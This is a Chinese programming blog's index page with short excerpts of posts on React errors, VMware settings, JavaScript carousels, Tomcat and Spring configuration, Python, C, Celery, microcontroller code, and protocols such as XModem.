<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程爱好者博客">
		<meta property="og:title" content="编程爱好者博客" />
<meta property="og:description" content="编程爱好者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bchobby.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程爱好者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cfc53513a51bbffa7324343a0c9b861e/" rel="bookmark">
			react报错 Warning: React.createElement: type is invalid . ..
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错说我可能类名定义错误或引入错误，我找了好久的原因都没有找到
因为我的输出是这样的：
const mapStateToProps = ({ createProjectModal, organization }) =&gt; { // loading let current; if (organization) { current = organization.current; } return { model: createProjectModal, organization: current }; // , loading: loading.models.createProjectModal }; export default connect(mapStateToProps)(CreateProjectModal); 引入是这样的：
import CreateProjectModal from '../../components/organization/createProjectModal'; 所以一直都找不到我的报错出在哪里，最终我打算重写该文件了（这是修改别人的代码），才发现问题所在！！！
原因是引入antd蚂蚁金服的框架的时候 文本框的引入出错了，我是这样写的
&lt;Input.textArea className="description" placeholder="项目简介" value={formVal.description} onChange={this.handleDescriptionChange} /&gt; 其实应该是
&lt;Input.TextArea /&gt; 知道真相的我，#￥%…………&amp;&amp;……&amp;%￥#
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d1957704392a9025d7f9a60b181d51f3/" rel="bookmark">
			解决某些软件无法在虚拟机中运行的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在虚拟机内下载并安装微图，直接打开会被提示“Sorry, this application cannot run under a Virtual Machine”，
大概意思就是“对不起，这个应用不能在虚拟机上运行”。
这时候我们需要先关闭虚拟机（不关闭之后的修改无效），
找到在新建虚拟机时系统的安装目录（图2）（不是软件虚拟机的安装目录！），
找到目录下的类似于“Windows 10 x64.vmx”的文件（这里安装的win10，所以是这个名字）。
找到后以记事本的方式打开该文件，
在文本的末尾增加如下内容：monitor_control.restrict_backdoor = "TRUE"，保存。
重新打开虚拟机，运行微图，现在就能够正常打开软件了。
备注：如果还是不行，可以再打开文件“Windows 10 x64.vmx”，
打开后再最后再增加一行：disable_acceleration = "TRUE"。
转载于:https://www.cnblogs.com/RM-Anton/p/9113826.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd6f0ad4c0c1861c289975d3770e97cc/" rel="bookmark">
			JS实现图片轮播效果（自动和手动）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本次轮播效果图如下：
具有以下功能：1.自动播放（鼠标进入显示区域时停止播放） 2.左右焦点切换 3.底下小按钮切换
ps:由于很多同志反馈无法总有各种奇怪的情况，所以有需要的直接下载整个工程：JS实现图片轮播效果
以下为实现代码：
首先是html代码：
&lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;最简单的轮播效果&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div class="box" id="box"&gt; &lt;div class="inner"&gt; &lt;!--轮播图--&gt; &lt;ul&gt; &lt;li&gt;&lt;a href="#"&gt;&lt;img src="images/1.jpg" alt=""&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;&lt;img src="images/2.jpg" alt=""&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;&lt;img src="images/3.jpg" alt=""&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;&lt;img src="images/4.jpg" alt=""&gt;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="#"&gt;&lt;img src="images/5.jpg" alt=""&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;ol class="bar"&gt; 小按钮数量无法确定，由js动态生成 &lt;/ol&gt; &lt;!--左右焦点--&gt; &lt;div id="arr"&gt; &lt;span id="left"&gt; &lt;&lt;/span&gt; &lt;span id="right"&gt;&gt;&lt;/span&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 接下来是css样式：
&lt;style&gt; * { margin: 0; padding: 0 } .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dd6f0ad4c0c1861c289975d3770e97cc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70a912f766798b9c1ea3d5d2dbb76570/" rel="bookmark">
			tomcat中设置全局变量(vm options)实现配置文件和项目分离
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		tomcat中设置全局变量实现配置文件和项目分离 由于项目中使用的文件较多，每次上线需要将包中的properties文件删除比较麻烦，所以需要将这些配置文件放在服务器一个指定的目录中，这样项目中就不包含这些配置文件方便部署。
那么如何加载这些配置文件?
1.通过设置tomcat的vm options来参数来加载配置文件,先在指定的目录中放入需要加载的配置文件,然后在tomcat的bin目录中找到catalina.bat文件,linux系统中为.sh文件，增加”set JAVA_OPTS=-server -Xms256m -Xmx512m -XX:PermSize=128M -XX:MaxNewSize=256m -XX:MaxPermSize=256m -Dglobal.config.path=G:\yididuocang\” 前面是设置的虚拟机内存参数，起作用的是”-Dglobal.config.path=G:\yididuocang\”是这个变量.
如果是开发环境,我们可以直接通过开发工具设置vm options ,因为我用的是idea,下面举例 2.我们项目中是spring加载的配置文件，所以只用修改相关的xml文件即可加载指定目录下的配置文件
&lt;bean id="configPropertiesTest" class="org.springframework.beans.factory.config.PropertiesFactoryBean"&gt; &lt;property name="locations"&gt; &lt;list&gt; &lt;value&gt;file:${global.config.path}/opc/opc-business/jdbc.write.properties&lt;/value&gt; &lt;value&gt;file:${global.config.path}/opc/opc-business/jdbc.read.properties&lt;/value&gt; &lt;/list&gt; &lt;/property&gt; &lt;/bean&gt; spring可以用来加载少量的配置文件,如果配置文件量多,推荐第一种
因为项目中遇到此问题,在网上找到答案,此处内容出处学习来至以下地方
http://flybear-chf.iteye.com/blog/1197762
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d13e7dd40affcb478ed48feef45b92dc/" rel="bookmark">
			Python中join()方法的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 描述：
Python的join()方法用于将序列中的元素以指定的字符连接生成一个新的字符串
语法：
str.join(sequence)
参数：
sequence 要连接的元素序列
返回值：
返回通过指定字符连接序列中的元素后生成的新的字符串
实例：
#！/usr/bin/python # _*_ coding: UTF-8 _*_ str = "-"; seq = ("a", "b", "c") #字符串序列 print str.join(seq); 输出结果为：
a-b-c 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8545ac65d7ccf56e13ddc2f4a8a42054/" rel="bookmark">
			TSP问题，贪心法，最近邻点，最短链接
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		笔者接着上一次的博客继续讨论TSP问题（TSP问题,动态规划法），这次采用贪心法，至少有两种贪心策略是合理的：最近邻点策略和最短链接策略。
（一）最近邻点策略
从任意城市出发，每次在没有到过的城市中选择最近的一个，直到经过了所有的城市，最后回到出发城市。 设图G有n个顶点，边上的代价存储在二维数组w[n][n]中，集合V存储图的顶点，集合P存储经过的边，最近邻点策略求解TSP问题的算法如下： 1． P={ }; 2． V=V-{u0}; u=u0; //从顶点u0出发 3． 循环直到集合P中包含n-1条边 3.1 查找与顶点u邻接的最小代价边(u, v)并且v属于集合V； 3.2 P=P+{(u, v)}; 3.3 V=V-{v}; 3.4 u=v; //从顶点v出发继续求解 代码实现如下： #include &lt;iostream.h&gt; #include&lt;fstream&gt; const int amount = 5; int TSP1(int arc[amount][amount], int temp) { int Count_hyh= 0, TSPLen_hyh = 0; int min_hyh, u, v; int tem[amount] = {0}; u = temp; tem[temp] = 1; while (Count_hyh&lt; amount-1) { min_hyh = 100; for (int j = 0; j &lt; amount; j++) if ((tem[j] == 0) &amp;&amp; (arc[u][j] !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8545ac65d7ccf56e13ddc2f4a8a42054/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60a3b1ff64c4dffbe6affd3299a5f262/" rel="bookmark">
			C语言printf()、sprintf()、vsprintf()的区别与联系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		from : https://blog.csdn.net/raito__/article/details/48860119 printf() 在控制台应用程序中最为常用，使用也很简单。其参数为格式化字符串。 函数原型：printf(const char *format,[argument]);
例如：
int a=1,b=2; printf("a=%d,b=%d",a,b); 输出：a=1,b=2 sprintf() 用于将输出存到字符缓冲中。 函数原型：sprintf(char *buffer, const char *format, [argument]);
例如：
int a=1,b=2; char s[10]; sprintf(s,"a=%d,b=%d",1,2); puts(s); 输出：a=1,b=2 vsprintf() 与sprintf() 功能类似。 需要引入相关头文件 #include &lt;stdarg.h&gt;
函数原型： vsprintf(char *buffer, char *format, va_list param);
例如：
void Myprintf(const char* fmt,...); int a=1,b=2; char s[10]; Myprintf("a=%d,b=%d",a,b); void Myprintf(const char* fmt,...) { char s[10]; va_start(ap, fmt); vsprintf(s,fmt,ap); va_end(ap); puts(s); } 输出：a=1,b=2 因此可以用 vsprintf() 来实现 sprintf()。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/60a3b1ff64c4dffbe6affd3299a5f262/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c6815038f628ecdc49ec22b68b71ca20/" rel="bookmark">
			KITTI双目数据集使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		KITTI是面向自动驾驶的标准测试数据集，这里关注其中双目数据 如图1所示，KITTI使用4个相机采集图像数据，两个为灰度相机，另外两个为彩色相机。 图1. 双目系统包含两个灰度相机和两个彩色相机
数据格式 KITTI目前有2012和2015两个双目数据集
stereo2015里可以下载立体校正后的图像对和标定文件；raw data里可以下载原始未校正的图像对和标定文件
一个典型的标定文件 calib_cam_to_cam.txt 如下：
calib_time: 09-Jan-2012 13:57:47 corner_dist: 9.950000e-02 S_00: 1.392000e+03 5.120000e+02 K_00: 9.842439e+02 0.000000e+00 6.900000e+02 0.000000e+00 9.808141e+02 2.331966e+02 0.000000e+00 0.000000e+00 1.000000e+00 D_00: -3.728755e-01 2.037299e-01 2.219027e-03 1.383707e-03 -7.233722e-02 R_00: 1.000000e+00 0.000000e+00 0.000000e+00 0.000000e+00 1.000000e+00 0.000000e+00 0.000000e+00 0.000000e+00 1.000000e+00 T_00: 2.573699e-16 -1.059758e-16 1.614870e-16 S_rect_00: 1.242000e+03 3.750000e+02 R_rect_00: 9.999239e-01 9.837760e-03 -7.445048e-03 -9.869795e-03 9.999421e-01 -4.278459e-03 7.402527e-03 4.351614e-03 9.999631e-01 P_rect_00: 7.215377e+02 0.000000e+00 6.095593e+02 0.000000e+00 0.000000e+00 7.215377e+02 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c6815038f628ecdc49ec22b68b71ca20/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/42bfb60dfb1850f8e080002906c7f4db/" rel="bookmark">
			python celery 多work多队列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.Celery模块调用既然celery是一个分布式的任务调度模块，那么celery是如何和分布式挂钩呢，celery可以支持多台不通的计算机执行不同的任务或者相同的任务。 如果要说celery的分布式应用的话，就要提到celery的消息路由机制，AMQP协议。具体的可以查看AMQP的文档。简单地说就是可以有多个消息队列(Message Queue)，不同的消息可以指定发送给不同的Message Queue，而这是通过Exchange来实现的。发送消息到Message Queue中时，可以指定routiing_key，Exchange通过routing_key来把消息路由(routes)到不同的Message Queue中去。
多worker，多队列，实例： 1.在服务器上编写文件tasks.py。首先定义一个Celery的对象，然后通过celeryconfig.py对celery对象进行设置。之后又分别定义了三个task，分别是taskA， taskB和add。
#!/usr/bin/env #-*-conding:utf-8-*- from celery import Celery,platforms platforms.C_FORCE_ROOT = True app = Celery() app.config_from_object("celeryconfig") @app.task def tashA(x,y): return x*y @app.task def taskB(x,y,z): return x+y+z @app.task def add(x,y): return x+y2.编写celeryconfig.py文件。 #!/usr/bin/env python #-*- coding:utf-8 -*- from kombu import Exchange,Queue from celery import platforms platforms.C_FORCE_ROOT = True BROKER_URL = "redis://localhost:6379/7" CELERY_RESULT_BACKEND = "redis://localhost:6379/8" CELERY_QUEUES = ( Queue("default",Exchange("default"),routing_key="default"), Queue("for_task_A",Exchange("for_task_A"),routing_key="for_task_A"), Queue("for_task_B",Exchange("for_task_B"),routing_key="for_task_B") ) CELERY_ROUTES = { 'tasks.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/42bfb60dfb1850f8e080002906c7f4db/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48c7d9eb59f7ad03e5534c4d8f3fb2d8/" rel="bookmark">
			单片机8x8点阵让数字0从右到左依次显示循环
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 用的单片机是普中的开发板，8x8点阵用的是74hc595进行段选，P0口位选
74hc595资料点击打开链接
8x8点阵用的是共阴极（左边的）
这次我要实现的是让数字0从右到左依次显示
#include &lt;reg52.h&gt; #include &lt;intrins.h&gt; typedef unsigned int u16; typedef unsigned char u8; sbit SCLK=P3^6; sbit RCK=P3^5; sbit SER=P3^4; u8 code duan0[8][8]={{0x00,0x3C,0x42,0x42,0x42,0x3C,0x00,0x00}, //数字0的段选 {0x3C,0x42,0x42,0x42,0x3C,0x00,0x00,0x00}, {0x42,0x42,0x42,0x3C,0x00,0x00,0x00,0x3C}, {0x42,0x42,0x3C,0x00,0x00,0x00,0x3C,0x42}, {0x42,0x3C,0x00,0x00,0x00,0x3C,0x42,0x42}, {0x3C,0x00,0x00,0x00,0x3C,0x42,0x42,0x42}, {0x00,0x00,0x00,0x3C,0x42,0x42,0x42,0x3C}, {0x00,0x00,0x3C,0x42,0x42,0x42,0x3C,0x00}}; u8 code wei[]={0x7f,0xbf,0xdf,0xef,0xf7,0xfb,0xfd,0xfe}; // 位选 void delay(u16 c)//延时函数 { u8 a,b; for(;c&gt;0;c--) for(b=142;b&gt;0;b--) for(a=2;a&gt;0;a--); } void sandbyte(u8 dat)//给74hc595发送段选的数据 { u8 i; SCLK=0; RCK=0; for(i=0;i&lt;8;i++) { SER=dat&gt;&gt;7; dat&lt;&lt;=1; SCLK=1; _nop_(); _nop_(); SCLK=0; } RCK=1; _nop_(); _nop_(); RCK=0; } void main() { u8 i,j; u8 num; while(1) { for(i=0;i&lt;8;i++) { num=40; while (num--) //让下面的for函数持续运行40次，让数字0 能停留一段时间 { for(j=0;j&lt;8;j++)	{	P0=wei[j]; sandbyte(duan0[i][j]); delay(1); sandbyte(0x00);	} }	delay(100); //这里是扫描延时100ms }	} } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/06182dd35a7b6c1c972eaeae1e0bcf48/" rel="bookmark">
			python 消息队列、异步分布式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.消息队列消息队列：是在消息的传输过程中保存消息的容器。 消息队列最经典的用法就是消费者和生成者之间通过消息管道来传递消息，消费者和生成者是不同的进程。生产者往管道中写消息，消费者从管道中读消息。 操作系统提供了很多机制来实现进程间的通信 ，multiprocessing模块就提供了Queue和Pipe两种方法来实现。
其中P指producer，即生产者；C指consumer，即消费者。中间的红色表示消息队列，实例中表现为HELLO队列。
1.生产消费实例 Queue 单向进行，即生产者只进行发消息，消费者只进行收 #导入模块 from multiprocessing import Queue from threading import Thread import time #创建生产者 def producer(q): print("start producer") for i in range(10): q.put(i) #发消息 time.sleep(0.5) print("end producer") #创建消费者，消费者一般是个死循环，要一直监听是否有需要处理的信息。 def customer(q): print("start customer") while 1: data = q.get() #收消息 print("customer has get value {0}".format(data)) if __name__ == '__main__': q = Queue() #创建一个队列 pro = Thread(target=producer,args=(q,)) cus = Thread(target=customer,args=(q,)) pro.start() cus.start() 结果为：
start producer start customer producer has produced value 0 customer has get value 0 producer has produced value 1 customer has get value 1 producer has produced value 2 customer has get value 2 producer has produced value 3 customer has get value 3 producer has produced value 4 customer has get value 4 producer has produced value 5 customer has get value 5 producer has produced value 6 customer has get value 6 producer has produced value 7 customer has get value 7 producer has produced value 8 customer has get value 8 producer has produced value 9 customer has get value 9 end producer 可见生产一个则消费一个。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/06182dd35a7b6c1c972eaeae1e0bcf48/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/458ae88c8da8a27e518cea05af0c62ce/" rel="bookmark">
			解决 MySQL命令窗口查看插入中文数据乱码问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MySQL中文数据乱码问题
解决办法：
查看命令提示符属性的编码方式
use names 自己电脑命令提示符属性的编码方式;
修改后的
插入也是一样的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab36d97ffdfa66e7f3634483c0086d12/" rel="bookmark">
			Latex表格宽度调整
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Latex表格宽度调整 原文：https://blog.csdn.net/Rained_99/article/details/79389189
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/579e2ad2105ae17573186e6a75267a90/" rel="bookmark">
			XYNUOJ 奇偶位互换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 #include&lt;stdio.h&gt;
#include&lt;string.h&gt;
int main()
{
int n;
int i;
char t;
scanf("%d",&amp;n);
for(;n-1&gt;=0;n--)
{
char a[50];
scanf("%s",a); //这句要是换成gets(a);
结果如图，用gets()就被吞掉字符，而scanf("%s",a); 就没事！
纳闷了，欢迎大神解释解释！
for(i=0;a[i]!='\0';i=i+2) { t=a[i]; a[i]=a[i+1]; a[i+1]=t; } puts(a)； } return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1fa2c1e006ad624038f72c776b18ee60/" rel="bookmark">
			小程序官方后台以管理员身份登录，仍提示未绑定开发者解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 开始做小程序开发的时候，微信公众平台|小程序的开发管理板块，用管理员账户登录，会提示未绑定开发者，但是点击“绑定开发者”进入“用户身份”页面，明明都有管理员的账号在里面，但是是有提示。不知道是不是新更新只有我一个遇到这个问题，网上竟然找不到任何资料。一头雾水，后台尝试一下，加了另外一个微信账号到“用户身份”，作为开发者身份后就可以了。相信是新版小程序页面的一个bug，在小程序的文档里面也还没有写清楚。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7240e5b5f74ae925690ec357f219661d/" rel="bookmark">
			vivado约束文件报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		'set_property' expects at least one object
报XDC里面的set_property找不到正确的object，这个在vivado后续版本中都显示为警告，一般都是处于object的port名大小写问题。
XDC和Verilog都对大小写敏感。建议RTL内部接口定义全部用小写。
错误： set_property PACKAGE_PIN "V7 " [get_ports "CN1_V7 "]
正确： set_property PACKAGE_PIN "V7 " [get_ports "CN1_v7 "]
ERROR: [DRC 23-20] Rule violation (UCIO-1) Unconstrained Logical Port - 9 out of 194 logical ports have no user assigned specific location constraint (LOC). This may cause I/O contention or incompatibility with the board power or connectivity affecting performance, signal integrity or in extreme cases cause damage to the device or the components to which it is connected.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7240e5b5f74ae925690ec357f219661d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2930e93bead78ca6f5131eb288f671c2/" rel="bookmark">
			Voronoi图和Delaunay三角网
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、使用Delaunator生成点的Delaunay图。
图1. 偏移，坐标设置不正确
二、利用D3.js生成Voronoi图与Delaunay三角网
D3.js v4生成的Voronoi图
2.1 定义projection
使用d3.geoMercator()定义数据所对应的投影。
let projection = d3.geoMercator(); 2.2 定义绘制path
利用d3.geoPath定义绘制地理数据所需的path。
let path = d3.geoPath().projection(projection) 2.3 GeoJSON点集数据
使用d3.json读取点集数据，并根据数据的格式进行解析，取得GeoJSON中的features。并根据feature数据中的geometry，获得其中的坐标信息（coordinates)，得到生成voronoi图所需的点集数据（points）。
图2. 底图，模拟的点集
2.4 生成voronoi图
使用前面所获得的坐标点集信息，利用d3.voronoi生成voronoi图的各多边形（polygons）。
voronoi(points).polygons 图3. 利用点集生成的Voronoi图
2.5 生成Delaunay三角网
voronoi.links(points) 图4. 点集对应的Delaunay三角网
2.6 Voronoi图与Delaunay三角网的叠加
图5. Voronoi图和Delaunay三角网的叠加
图6. 结合OpenLayers，集成Voronoi图
图7. 集成Voronoi和Delaunay图，使用ImageCanvas绘制
三、裁剪，把约束范围外的图形裁剪掉
3.1 裁剪的方法
使用空间裁剪算法：Greiner-Hormann；Cohen-Sutherland；Martinez-Rueda；Weiler-Atherton；Vatti
使用绘制底层裁剪方法：Canvas clip；SVG clip
3.2 利用Canvas Clip进行裁剪的结果
1）读取裁剪区域的Geometry多边形；
2）循环读取坐标对；
3）利用projection，把坐标对从地理空间（Earth）投影到像素空间（Screen）;
4) 利用转换的坐标对构建Canvas clip对象；
图8. 裁剪的结果
图9. 裁剪的结果
3.3 使用Canvas clip进行裁剪中存在的问题
1）多个多边形，如何裁剪？台湾及海南岛的问题。
2）没有考虑边界的Voronoi效应；只是单纯的裁剪。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2930e93bead78ca6f5131eb288f671c2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db01be6fefb685036795280e2c35a383/" rel="bookmark">
			关于python2的json格式转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		json.loads() 将json格式转换为python字典
json.dumps() 将python字典转换为json格式
python想要以中文输出json格式的话，应该这样写json.dumps(json.loads(info,ensure_ascii=False))
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b4ce7b4ec32f1af8d945fd99a6480a4/" rel="bookmark">
			C语言写一个计算器的三种方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		方法一：常规方法
#include&lt;stdio.h&gt; int Add(int a, int b) { return a + b; } int Sub(int a, int b) { return a - b; } int Mul(int a, int b) { return a * b; } int Div(int a, int b) { return a / b; } void menu() { printf("****************************\n"); printf("***** 1.add 2.sub *****\n"); printf("***** 3.mul 4.div *****\n"); printf("****** 0.exit *****\n"); printf("****************************\n"); } int main() { int input = 1; int x = 0; int y = 0; int ret = 0; while (input) { menu(); printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b4ce7b4ec32f1af8d945fd99a6480a4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e6b04d99cf7f41d21c90e9813fbf2766/" rel="bookmark">
			XModem协议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		出处：XModem协议
XModem协议介绍：
XModem是一种在串口通信中广泛使用的异步文件传输协议，分为XModem和1k-XModem协议两种，前者使用128字节的数据块，后者使用1024字节即1k字节的数据块。
一、XModem校验和协议
1. XModem信息包格式
XModem协议最早由Ward Christensen在20世纪70年代提出并实现的，传输数据单位为信息包，信息包格式如下：
--------------------------------------------------------------------------- | Byte1 | Byte2 | Byte3 |Byte4~Byte131| Byte132 | |-------------------------------------------------------------------------| |Start Of Header|Packet Number|~(Packet Number)| Packet Data | Check Sum | --------------------------------------------------------------------------- 2. 校验和的计算
所有的数据字节都将参与和运算，由于校验和只占一个字节，如果累加的和超过255将从零开始继续累加。
3. 字段定义
&lt;SOH&gt; 01H
&lt;EOT&gt; 04H
&lt;ACK&gt; 06H
&lt;NAK&gt; 15H
&lt;CAN&gt; 18H
4. 校验和方式的XModem传输流程
传输流程如图所示：
------------------------------------------------------------------------------ | SENDER | | RECIEVER | | | &lt;--- | NAK | | | | Time out after 3 second | | | &lt;--- | NAK | | SOH|0x01|0xFE|Data[0~127]|CheckSum| | ---&gt; | | | | &lt;--- | ACK | | SOH|0x02|0xFD|Data[0~127]|CheckSum| | ---&gt; | | | | &lt;--- | NAK | | SOH|0x02|0xFD|Data[0~127]|CheckSum| | ---&gt; | | | | &lt;--- | ACK | | SOH|0x03|0xFC|Data[0~127]|CheckSum| | ---&gt; | | | | &lt;--- | ACK | | .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e6b04d99cf7f41d21c90e9813fbf2766/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/66a5e709aadb04cca71a729beea7e165/" rel="bookmark">
			SpringMvc提交问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid request message framing, or deceptive request routing).
这个异常是因为提交参数的类型和接收方的类型不一致产生的
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b39a5a4c012fdbfeaad12d7096dd4ce0/" rel="bookmark">
			File基础知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1:什么是file？
文件和文件夹：
文件夹是用来组织和管理磁盘文件的一种数据结构。
文件是在电脑中，一实现某种功能、或某个软件的部分功能为目的定义的一个单位。文件是由文件名和图标组成，一种类型的文件具有相同的图标。 2:File类的功能。 （1）：获得文件或文件夹的属性信息。
（）：创建、删除、重命名文件等。
3：常见方法解释 canRead() 测试应用程序是否能从指定的文件中进行读取。 canWrite() 测试应用程序是否能写当前文件。 delete() 删除当前对象指定的文件。 equals(Object) 比较该对象和指定对象。 exists() 测试当前 File 是否存在。 getAbsolutePath() 返回由该对象表示的文件的绝对路径名。 getCanonicalPath() 返回当前 File 对象的路径名的规范格式。 getName() 返回表示当前对象的文件名。 getParent() 返回当前 File 对象路径名的父路径名，如果此名没有父路径则为 null。 getPath() 返回表示当前对象的路径名。 hashCode() 计算此文件的一个哈希码。 isAbsolute() 测试当前 File 对象表示的文件是否是一个绝对路径名。 isDirectory() 测试当前 File 对象表示的文件是否是一个路径。 isFile() 测试当前 File 对象表示的文件是否是一个“普通”文件。 lastModified() 返回当前 File 对象表示的文件最后修改的时间。 length() 返回当前 File 对象表示的文件长度。 list() 返回当前 File 对象指定的路径文件列表。 list(FilenameFilter) 返回当前 File 对象指定的目录中满足指定过滤器的文件列表。 mkdir() 创建一个目录，它的路径名由当前 File 对象指定。 mkdirs() 创建一个目录，它的路径名由当前 File 对象指定，包括任一必须的父路径。 renameTo(File) 将当前 File 对象指定的文件更名为给定参数 File 指定的路径名。 toString() 返回当前对象的字符串表示.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b39a5a4c012fdbfeaad12d7096dd4ce0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9ac9cb6ec1ec0a395aea89bb6584488b/" rel="bookmark">
			谷歌调试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
